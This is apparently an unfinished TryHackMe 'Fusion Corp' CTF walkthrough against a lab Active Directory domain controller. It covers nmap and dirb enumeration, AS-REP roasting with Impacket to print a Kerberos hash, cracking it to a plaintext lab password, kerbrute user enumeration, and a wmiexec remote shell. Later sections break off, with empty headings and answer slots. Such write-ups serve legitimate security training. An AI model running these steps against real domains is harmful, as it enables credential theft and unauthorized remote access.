<p align="center">May 1, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{360}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="" alt="Your Image Badge"><br>
<img width="200px" src="https://github.com/user-attachments/assets/28b561fc-e1c5-4660-a1d1-35253055f98b"><br></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Fusion Corp}}$$</h1>
<p align="center"><em>Fusion Corp said they got everything patched... did they?</em>!<br>
It is classified as a hard-level CTF.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/fusioncorp">here</a>.</p>

<p align="center"> <img width="1000px" src=""> </p>


<br>
<br>

<h2>Task 1 . Fusion Corp</h2>


<p>You had an engagement a while ago for Fusion Corp. They contacted you saying they've patched everything reported and you can start retesting.</p>

<br>
<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>




<h2 align="center"> $$\textcolor{#f00c17}{\textnormal{Enumeration}}$$ </h2>

<h2 align="center">nmap</h2>
<p>- Concluded that Directory Domain Controller might be active because ports <code>53/TCP</code>, <code>88 / Microsoft Windows Kerberos</code> and <code>389 / Microsoft Windows Active Directory LDAP</code> are open.<br>
- Identified domain name <code>fusion.corp</code>. There is also LDAP in port  <code>3268</code>.</p>

```bash
:~/FusionCorp# nmap -sC -sV -n -Pn -p- -T4 TargetIP
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: eBusiness Bootstrap Template
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-01 17:55:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-01...
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Not valid before: 2025-04-30T17:52:06
|_Not valid after:  2025-10-30T17:52:06
|_ssl-date: 2025-05-01T17:58:37+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
...
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: FUSION-DC, NetBIOS user: <unknown>, NetBIOS MAC: 0...(unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-01...
|_  start_date: N/A

...
:~/FusionCorp# 
```

<br>

![Hard 🚩 - Fusion Corp - 01 - nmap](https://github.com/user-attachments/assets/b8313e24-0f4a-416c-8223-3676d3cbc6dc)

<br>


<h2 align="center">dirb</h2>

```bash
:~/FusionCorp# dirb http://TargetIP /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

...
URL_BASE: http://TargetIP/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://TargetIP/ ----
==> DIRECTORY: http://TargetIP/backup/                                                               
==> DIRECTORY: http://TargetIP/css/                                                                  
==> DIRECTORY: http://TargetIP/img/                                                                  
+ http://TargetIP/index.html (CODE:200|SIZE:53888)                                                   
==> DIRECTORY: http://TargetIP/js/                                                                   
==> DIRECTORY: http://TargetIP/lib/                                                                  
...
:~/FusionCorp# 
```

<br>

![Hard 🚩 - Fusion Corp - 2 - dirb](https://github.com/user-attachments/assets/7c787bf6-796e-4c07-b642-4ad9f2acf3cc)

<br>

![Hard 🚩 - Fusion Corp - 03 - domain name in etc hosts](https://github.com/user-attachments/assets/d82410a7-107a-4291-97d4-1a69e0afa746)

<br>

<h2 align="center">http://TargetIP</h2>

<br>

![Hard 🚩 - Fusion Corp - 04 - Navigated to TargetIP](https://github.com/user-attachments/assets/e931621e-c40e-4d41-a9f8-99a59b0311bf)


<br>

<h2 align="center">http://TargetIP/backup</h2>

<br>

![Hard 🚩 - Fusion Corp - 05 - Navigated to TargetIP-backup](https://github.com/user-attachments/assets/f4cbeadd-2f88-4b99-a182-40ad3d018b31)


<br>

<h2 align="center">http://TargetIP/backup/employees.ods</h2>

<br>

<p>Clicked <code>employees.ods</code>.<br><br>
Double-clicked <code>employees.ods</code> and opened it in <code>LibbreOffice</code>.<br><br>
Created a file with the <code>usernames</code> --> <code>usernames.txt</code></p>

<br>

![Hard 🚩 - Fusion Corp - 06 - Downloaded employees ods](https://github.com/user-attachments/assets/02011a1c-d380-41ca-8d4f-9a3a883880e2)


<br>

![Hard 🚩 - Fusion Corp - 07 - Opened employees ods in LibreOffice Calc](https://github.com/user-attachments/assets/0810a149-c192-4411-a400-d95caf767af6)


<h2 align="center">Impacket GetNPUsers</h2>

<br>

```bash
~/FusionCorp# python3 /opt/impacket/build/scripts-3.9/GetNPUsers.py fusion.corp/ -usersfile usernames.txt -dc-ip TargetIP -outputfile Hash -request
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

:~/FusionCorp# ls
Hash  usernames.txt
:~/FusionCorp# cat Hash
$krb5asrep$23$lparker@FUSION.CORP:7a4ad3775cf8c45e8bc9f6e12ceedf43$d26785939261cf2a492c382c25d81767556867ecd3de9e134bb32b313c4ffa1d490310c7bc814cd949ee5b29a26b9a8c90e39af9b6b3e4be57011b94c463110deae3bd4e3f8cef94d96ad1dab26d106689fbf455d01feb4407d94d91aba82e3bf6611594cb566a999a3bf55f649ba3a0e5e1ed3f680b357b241c86bdde9d5aa8287f9f7dfbcce841a63b51d42d02d30da99b28614ddda39eba6cd973dfe1eb1ba6b7de7b39ebeb8cffa9a774f2109283a1a7714d240ae821fe6690b6ab363d0ec8db4324889eec196ff7b7562bde05b17c9b4b0fede13f601ff9d7b2ea9bf1870d237a71bfc935342437
root@ip-10-10-250-201:~/FusionCorp# 
```

<br>


<h2 align="center">hashcat</h2>
<p>Cracked the hash using <code>hashcat</code>.<br><br>
Identified <code>lparker</code>:<code>!!abbylvzsvs2k6!</code><br><br>
Confirmed <code>Kerberos</code>´ <code>lparker@FUSION.CORP</code>;</p>

<br>

![Hard 🚩 - Fusion Corp - 10 - Created a file with the hash](https://github.com/user-attachments/assets/68f6fa69-3928-4eac-82b4-314a1a430891)


<br>

![Hard 🚩 - Fusion Corp - 11 - Ran hashcat](https://github.com/user-attachments/assets/3d155e30-b881-4616-a8c6-2234c2e57b5d)

<br>

![Hard 🚩 - Fusion Corp - 12 - Discovered a valid user and its password](https://github.com/user-attachments/assets/11de4802-49c3-46f9-bd3b-782956619c88)

<br>

<br>

<h2 align="center">kerbrute</h2>
<p>Used <code>kerbrute</code> which user(s) are/is valid.<br><br>
Downloaded and used <code>kerbrute</code>.<br><br>
Downloaded it from here --> https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64</p>

<br>

```bash
:~/FusionCorp# chmod +x kerbrute_linux_amd64
...
~/FusionCorp# ./kerbrute_linux_amd64 userenum -d fusion.corp --dc TargetIP /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
```
<br>







<p><code>lparker@FUSION.CORP</code>:<code>!!abbylvzsvs2k6!</code></p>

<br>

<br>

<h2 align="center">crackmapexec</h2>
<p>Installed <code>crackmapexec</code> and used it to </p>

<br>

```bash
:~/FusionCorp# snap install crackmapexec

<br>

<h2 align="center">wmiexec</h2>
<p>- <code>wget https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/wmiexec.py</code><br>
- <code>chmod +x wmiexec.py</code><br>
- <code>wmiexec.py -k -no-pass lparker@FUSION.CORP</code><br>
- Got the shell</p>

<br>

<br>


<h2 align="center">Domain users details</h2>

<br>

<br>


<h2 align="center">user <code>Joseph Murphy</code></h2>

<br>

<br>



<h2 align="center">http://TargetIP</h2>

> 1.1. <em>User1</em><br><a id='1.1'></a>
>> <strong><code>_____</code></strong><br>
<p></p>

<br>

> 1.2. <em>User 2</em><br><a id='1.2'></a>
>> <strong><code>_____</code></strong><br>
<p></p>

<br>

> 1.3. <em>User 3</em><br><a id='1.3'></a>
>> <strong><code>_____</code></strong><br>
<p></p>

